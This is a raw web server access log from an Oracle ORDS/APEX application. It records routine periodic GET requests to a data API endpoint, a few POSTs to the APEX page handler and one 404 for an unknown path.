46.146.210.91 - - [01/Dec/2022:00:42:06 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:32:04&vEND_DT=01.12.2022%2000:42:04 HTTP/1.1" 200 23569
195.222.149.195 - - [01/Dec/2022:00:42:13 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:33:45&vEND_DT=30.11.2022%2022:43:45 HTTP/1.1" 200 48140
46.146.210.91 - - [01/Dec/2022:00:42:15 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:32:14&vEND_DT=01.12.2022%2000:42:14 HTTP/1.1" 200 26605
94.51.211.239 - - [01/Dec/2022:00:42:17 +0500] "POST /ords/wwv_flow.show HTTP/1.1" 200 1568938
195.222.149.195 - - [01/Dec/2022:00:42:22 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:33:55&vEND_DT=30.11.2022%2022:43:55 HTTP/1.1" 200 49675
46.146.210.91 - - [01/Dec/2022:00:42:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:32:24&vEND_DT=01.12.2022%2000:42:24 HTTP/1.1" 200 31409
172.105.77.209 - - [01/Dec/2022:00:42:29 +0500] "GET /0bef HTTP/1.0" 404 1002
195.222.149.195 - - [01/Dec/2022:00:42:33 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:34:05&vEND_DT=30.11.2022%2022:44:05 HTTP/1.1" 200 49675
46.146.210.91 - - [01/Dec/2022:00:42:35 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:32:34&vEND_DT=01.12.2022%2000:42:34 HTTP/1.1" 200 26785
195.222.149.195 - - [01/Dec/2022:00:42:43 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:34:15&vEND_DT=30.11.2022%2022:44:15 HTTP/1.1" 200 50608
46.146.210.91 - - [01/Dec/2022:00:42:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:32:44&vEND_DT=01.12.2022%2000:42:44 HTTP/1.1" 200 28720
94.51.211.239 - - [01/Dec/2022:00:42:50 +0500] "POST /ords/wwv_flow.show HTTP/1.1" 200 1568946
195.222.149.195 - - [01/Dec/2022:00:42:53 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:34:25&vEND_DT=30.11.2022%2022:44:25 HTTP/1.1" 200 47571
46.146.210.91 - - [01/Dec/2022:00:42:55 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:32:54&vEND_DT=01.12.2022%2000:42:54 HTTP/1.1" 200 28720
195.222.149.195 - - [01/Dec/2022:00:43:03 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:34:35&vEND_DT=30.11.2022%2022:44:35 HTTP/1.1" 200 43352
46.146.210.91 - - [01/Dec/2022:00:43:05 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:33:04&vEND_DT=01.12.2022%2000:43:04 HTTP/1.1" 200 27205
195.222.149.195 - - [01/Dec/2022:00:43:13 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:34:45&vEND_DT=30.11.2022%2022:44:45 HTTP/1.1" 200 49117
46.146.210.91 - - [01/Dec/2022:00:43:15 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:33:14&vEND_DT=01.12.2022%2000:43:14 HTTP/1.1" 200 24252
195.222.149.195 - - [01/Dec/2022:00:43:23 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:34:55&vEND_DT=30.11.2022%2022:44:55 HTTP/1.1" 200 49117
46.146.210.91 - - [01/Dec/2022:00:43:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:33:24&vEND_DT=01.12.2022%2000:43:24 HTTP/1.1" 200 24252
195.222.149.195 - - [01/Dec/2022:00:43:33 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:35:05&vEND_DT=30.11.2022%2022:45:05 HTTP/1.1" 200 47187
46.146.210.91 - - [01/Dec/2022:00:43:35 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:33:34&vEND_DT=01.12.2022%2000:43:34 HTTP/1.1" 200 24252
195.222.149.195 - - [01/Dec/2022:00:43:43 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:35:15&vEND_DT=30.11.2022%2022:45:15 HTTP/1.1" 200 44141
46.146.210.91 - - [01/Dec/2022:00:43:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:33:44&vEND_DT=01.12.2022%2000:43:44 HTTP/1.1" 200 24252
195.222.149.195 - - [01/Dec/2022:00:43:53 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:35:25&vEND_DT=30.11.2022%2022:45:25 HTTP/1.1" 200 42624
46.146.210.91 - - [01/Dec/2022:00:43:56 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:33:54&vEND_DT=01.12.2022%2000:43:54 HTTP/1.1" 200 21306
195.222.149.195 - - [01/Dec/2022:00:44:03 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:35:36&vEND_DT=30.11.2022%2022:45:36 HTTP/1.1" 200 42624
46.146.210.91 - - [01/Dec/2022:00:44:05 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:34:04&vEND_DT=01.12.2022%2000:44:04 HTTP/1.1" 200 21306
195.222.149.195 - - [01/Dec/2022:00:44:12 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:35:46&vEND_DT=30.11.2022%2022:45:46 HTTP/1.1" 200 42625
46.146.210.91 - - [01/Dec/2022:00:44:15 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:34:14&vEND_DT=01.12.2022%2000:44:14 HTTP/1.1" 200 21306
195.222.149.195 - - [01/Dec/2022:00:44:23 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:35:56&vEND_DT=30.11.2022%2022:45:56 HTTP/1.1" 200 46597
46.146.210.91 - - [01/Dec/2022:00:44:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:34:24&vEND_DT=01.12.2022%2000:44:24 HTTP/1.1" 200 19793
195.222.149.195 - - [01/Dec/2022:00:44:33 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:36:06&vEND_DT=30.11.2022%2022:46:06 HTTP/1.1" 200 46597
94.51.211.239 - - [01/Dec/2022:00:44:35 +0500] "POST /ords/wwv_flow.show HTTP/1.1" 200 12
46.146.210.91 - - [01/Dec/2022:00:44:35 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:34:34&vEND_DT=01.12.2022%2000:44:34 HTTP/1.1" 200 19793
195.222.149.195 - - [01/Dec/2022:00:44:43 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:36:16&vEND_DT=30.11.2022%2022:46:16 HTTP/1.1" 200 48113
46.146.210.91 - - [01/Dec/2022:00:44:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:34:44&vEND_DT=01.12.2022%2000:44:44 HTTP/1.1" 200 19793
195.222.149.195 - - [01/Dec/2022:00:44:57 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:36:26&vEND_DT=30.11.2022%2022:46:26 HTTP/1.1" 200 49644
46.146.210.91 - - [01/Dec/2022:00:44:57 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:34:54&vEND_DT=01.12.2022%2000:44:54 HTTP/1.1" 200 19793
195.222.149.195 - - [01/Dec/2022:00:45:05 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:36:36&vEND_DT=30.11.2022%2022:46:36 HTTP/1.1" 200 49644
46.146.210.91 - - [01/Dec/2022:00:45:06 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:35:04&vEND_DT=01.12.2022%2000:45:04 HTTP/1.1" 200 19793
195.222.149.195 - - [01/Dec/2022:00:45:14 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:36:46&vEND_DT=30.11.2022%2022:46:46 HTTP/1.1" 200 52594
46.146.210.91 - - [01/Dec/2022:00:45:16 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:35:14&vEND_DT=01.12.2022%2000:45:14 HTTP/1.1" 200 26983
94.51.211.239 - - [01/Dec/2022:00:45:22 +0500] "POST /ords/wwv_flow.show HTTP/1.1" 200 12
195.222.149.195 - - [01/Dec/2022:00:45:26 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:36:56&vEND_DT=30.11.2022%2022:46:56 HTTP/1.1" 200 52594
46.146.210.91 - - [01/Dec/2022:00:45:27 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:35:24&vEND_DT=01.12.2022%2000:45:24 HTTP/1.1" 200 26983
195.222.149.195 - - [01/Dec/2022:00:45:34 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:37:06&vEND_DT=30.11.2022%2022:47:06 HTTP/1.1" 200 48112
46.146.210.91 - - [01/Dec/2022:00:45:35 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:35:34&vEND_DT=01.12.2022%2000:45:34 HTTP/1.1" 200 25051
195.222.149.195 - - [01/Dec/2022:00:45:44 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:37:16&vEND_DT=30.11.2022%2022:47:16 HTTP/1.1" 200 48112
